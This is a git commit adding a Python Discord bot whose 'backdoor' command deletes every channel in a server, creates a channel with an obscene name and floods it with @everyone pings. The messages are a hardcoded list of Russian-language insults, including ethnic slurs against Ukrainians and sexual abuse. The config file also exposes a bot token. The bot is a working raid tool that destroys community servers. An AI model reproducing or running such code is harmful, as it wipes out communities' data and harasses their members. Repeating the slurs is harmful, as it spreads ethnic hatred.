c3033fdcbd0a46cba7b90f5eb102e63984d431c0
mishasok <S347614s347614>
2021-08-29 17:50:12 +0200

    hahaha

---
+++ config.py
@@ -0,0 +1,18 @@
+settings = {
+    'token': 'ODU5NDY2OTA5NjU2MTU0MTUy.YNtG7w.ahxR-YK0LVA-1nSqS9NsWll9CgM',
+    'prefix': '!',
+    'server_id': '860205308495790092',
+    'channel_name': 'fuck-you'
+}
+
+other_server = 'ODU5NDY2OTA5NjU2MTU0MTUy.YNtG7w.ahxR-YK0LVA-1nSqS9NsWll9CgM'
+
+funny_sentenses = ["Вас заскамили на 10кг сала",
+                   "Взлом произведён из Крым(Россия)",
+                   "Ваше очко было разорвано хакерами из России",
+                   "Украина це Европа!:pig: :flag_eu:",
+                   "Standoff - залупа для бомжей",
+                   "Сыр хохланд делают из хохлов",
+                   "Сало уронило!",
+                   "Когда я ебу твою мать она хрюкает:pig:",
+                   ]
---
+++ main.py
@@ -0,0 +1,48 @@
+import discord
+from discord.ext import commands
+from config import *
+from discord.utils import get
+import time
+import random
+
+RUNNING = True
+bot = commands.Bot(command_prefix=settings['prefix'])
+channels_mass = []
+intents = discord.Intents.all()
+
+
+@bot.event
+async def on_ready():
+    for channel in bot.get_guild(880509155817971713).channels:
+        channels_mass.append(channel.id)
+    print(bot.user.name)
+    print(bot.user.id)
+    bot_id = bot.user.id
+
+
+@bot.command()
+async def backdoor(ctx):
+    try:
+        guild = ctx.guild
+        for channel in guild.channels:
+            await channel.delete()
+        guild = ctx.message.guild
+        await guild.create_text_channel(settings['channel_name'])
+
+        channel = discord.utils.get(ctx.guild.channels, name=settings['channel_name'])
+        channel_id = channel.id
+        channel = await bot.fetch_channel(channel_id)
+        last = ''
+        while RUNNING:
+            now = random.choice(funny_sentenses)
+            if now != last:
+                await channel.send(f'@everyone {now}')
+                last = now
+            else:
+                continue
+            time.sleep(0.5)
+    except Exception as Error:
+        print('Backdoor command error:', Error)
+
+
+bot.run(settings['token'])
